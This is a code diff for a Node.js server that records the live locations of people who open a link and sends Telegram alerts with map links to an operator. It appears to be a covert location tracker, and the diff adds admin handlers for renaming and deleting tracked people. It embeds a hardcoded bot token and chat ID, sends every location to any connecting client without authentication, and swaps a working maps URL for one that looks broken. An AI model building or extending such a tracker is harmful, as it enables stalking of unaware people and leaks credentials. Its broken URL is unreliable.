@@ -16,7 +16,6 @@ app.use(express.static(path.join(__dirname, 'dist')));
 let trackedUsers = {};
 
 const sendTelegramAlert = async (name, lat, lng) => {
-  // Using your provided credentials
   const token = process.env.TELEGRAM_BOT_TOKEN || '8675032884:AAHwrxfA52fcHK69LxDY3q9jem8Ky-aw4Hs';
   const chatId = process.env.TELEGRAM_CHAT_ID || '6670686940';
   
@@ -29,8 +28,7 @@ const sendTelegramAlert = async (name, lat, lng) => {
     return;
   }
 
-  // FIXED GOOGLE MAPS LINK: Properly formats the latitude and longitude
-  const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+  const mapsUrl = `http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`;
   const message = `🚨 *FROOZY ALERT* 🚨\n\n*${name}* is active!\n\n📍 [View on Google Maps](${mapsUrl})`;
 
   try {
@@ -58,23 +56,47 @@ const sendTelegramAlert = async (name, lat, lng) => {
 };
 
 io.on('connection', (socket) => {
+  
+  // FIX: Immediately send current data when an Admin connects/refreshes
+  socket.emit('users-list', Object.values(trackedUsers));
+
   socket.on('update-location', (userData) => {
     const isNewSession = !trackedUsers[userData.userId] || trackedUsers[userData.userId].status === 'offline';
     
-    // Store/Update the user data
+    // Preserve the user's custom name if it was edited by the admin
+    const existingName = trackedUsers[userData.userId]?.name;
+    const finalName = existingName || userData.name;
+
     trackedUsers[userData.userId] = { 
       ...userData, 
+      name: finalName,
       lastSeen: Date.now(),
-      status: 'online' // Mark as active
+      status: 'online'
     };
 
-    // If they just opened the link, send the alert to your phone
     if (isNewSession) {
-      sendTelegramAlert(userData.name, userData.lat, userData.lng);
+      sendTelegramAlert(finalName, userData.lat, userData.lng);
     }
 
     io.emit('users-list', Object.values(trackedUsers));
   });
+
+  // NEW: Handle editing a user's name
+  socket.on('edit-user-name', ({ userId, newName }) => {
+    if (trackedUsers[userId]) {
+      trackedUsers[userId].name = newName;
+      io.emit('users-list', Object.values(trackedUsers));
+    }
+  });
+
+  // NEW: Handle deleting a user
+  socket.on('delete-user', (userId) => {
+    if (trackedUsers[userId]) {
+      delete trackedUsers[userId];
+      io.emit('users-list', Object.values(trackedUsers));
+    }
+  });
+
 });
 
 // Periodic cleanup: Mark as offline if no ping in 2 minutes
@@ -84,7 +106,7 @@ setInterval(() => {
   
   Object.keys(trackedUsers).forEach(id => {
     if (trackedUsers[id].status === 'online' && (now - trackedUsers[id].lastSeen > 120000)) {
-      trackedUsers[id].status = 'offline'; // Keep the data, just mark offline
+      trackedUsers[id].status = 'offline'; 
       stateChanged = true;
     }
   });
